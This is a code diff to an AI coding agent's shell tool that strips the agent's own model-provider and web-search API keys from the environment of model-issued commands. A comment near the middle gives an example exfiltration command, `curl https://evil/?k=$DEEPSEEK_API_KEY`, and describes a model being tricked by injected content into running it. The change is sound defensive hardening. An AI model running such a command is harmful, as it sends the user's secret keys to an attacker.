@@ -10,7 +10,8 @@
 import { getBackground, killBackground, listBackground, startBackground } from "@echo-agent/core/background";
 import { spawn, spawnSync, type ChildProcess } from "node:child_process";
 import { existsSync } from "node:fs";
-import { toolError, toolOk, type AgentBackground, type AgentToolResult, type ModelTool } from "@echo-agent/core";
+import { BUILTIN_PROVIDER_KEY_ENV, toolError, toolOk, type AgentBackground, type AgentToolResult, type ModelTool } from "@echo-agent/core";
+import { BRAVE_ENV } from "./web.ts";
 
 /** 命令跑在什么环境里：`tool:shell` 段据此写明平台与 bash 版本（macOS 的 BSD 工具链、bash 3.2 的缺口）。 */
 export type ShellEnvironment = { platform: NodeJS.Platform; bashVersion: string | null };
@@ -75,6 +76,20 @@ const NON_INTERACTIVE_ENV = {
   GH_PAGER: "cat",
   GIT_TERMINAL_PROMPT: "0",
 } as const;
+
+/**
+ * 命令看不到的环境变量（2026-11-15）：echo 自己的 key——各家模型（`BUILTIN_PROVIDER_KEY_ENV`）与 web_search。
+ * 命令是模型给的，模型可能被注入的内容骗着跑 `curl https://evil/?k=$DEEPSEEK_API_KEY`；这些 key 命令本来也用不着。
+ * 用户自己的 token（`GITHUB_TOKEN`、`NPM_TOKEN` 这类）照旧传：`gh`、`npm` 要用，剥了会悄悄失去认证。
+ */
+const SECRET_ENV: ReadonlySet<string> = new Set([...BUILTIN_PROVIDER_KEY_ENV, BRAVE_ENV]);
+
+/** 起 shell 用的环境：父进程的去掉 `SECRET_ENV`，再盖上非交互的几项。 */
+export function shellEnv(parent: NodeJS.ProcessEnv, cwd: string): NodeJS.ProcessEnv {
+  const env: NodeJS.ProcessEnv = {};
+  for (const [k, v] of Object.entries(parent)) if (!SECRET_ENV.has(k)) env[k] = v;
+  return { ...env, ...NON_INTERACTIVE_ENV, PWD: cwd };
+}
 
 export type BashDeps = {
   /** 给了才支持 background: true(接 agent.background);job_output / job_stop 也读同一张表。 */
@@ -188,7 +203,7 @@ function withCwdMarker(command: string): string {
  * 不然 `sleep 10`、dev server 这类由 bash 再起的子进程会活过 bash，攥着输出管道不放——超时/中止要等它自己结束，job_stop 也留孤儿。
  *
  * `bash -c`，不是登录 shell：登录 shell 会读 profile，macOS 上 `path_helper` 还会把系统目录排到 PATH 前面，
- * 用户装的 git / ruby / node 就变成了系统那一份。命令看到的环境与启动 echo-coding 的那个 shell 一致。
+ * 用户装的 git / ruby / node 就变成了系统那一份。命令看到的环境与启动 echo-coding 的那个 shell 一致，只少 echo 自己的 key（`shellEnv`）。
  * `PWD` 例外，设成本次的起点：继承来的是父进程的目录，bash 发现它不指向当前目录就改用物理路径——
  * 工作区经软链时（macOS 的 `/var` → `/private/var`）`$PWD` 成了展开后的路径，第一条命令就被当成「cd 过了」。
  */
@@ -197,7 +212,7 @@ function spawnShell(command: string, cwd: string): ChildProcess {
     cwd,
     stdio: ["ignore", "pipe", "pipe"],
     detached: true,
-    env: { ...process.env, ...NON_INTERACTIVE_ENV, PWD: cwd },
+    env: shellEnv(process.env, cwd),
   });
 }
 
